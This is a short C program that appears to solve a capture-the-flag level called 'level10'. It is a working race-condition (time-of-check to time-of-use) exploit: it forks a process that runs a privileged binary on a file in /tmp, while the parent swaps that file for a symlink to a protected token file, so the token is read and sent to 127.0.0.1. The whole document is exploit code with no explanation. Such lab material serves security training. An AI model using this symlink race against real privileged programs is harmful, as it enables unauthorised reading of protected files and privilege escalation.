#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

#define TOKEN "/home/user/level10/token"
#define LINK "/tmp/access_link"
#define BIN "/home/user/level10/level10"

int	main(int ac, char **av) {
	pid_t	pid = 0;

	unlink(LINK);
	open(LINK, O_CREAT | O_RDONLY, 0666);
	pid = fork();
	if (pid > 0 ) {
		remove(LINK);
		symlink(TOKEN, LINK);
	}
	else if (pid == 0) {
		system(BIN" "LINK" 127.0.0.1");
		exit(EXIT_SUCCESS);
	}
	return (0);
}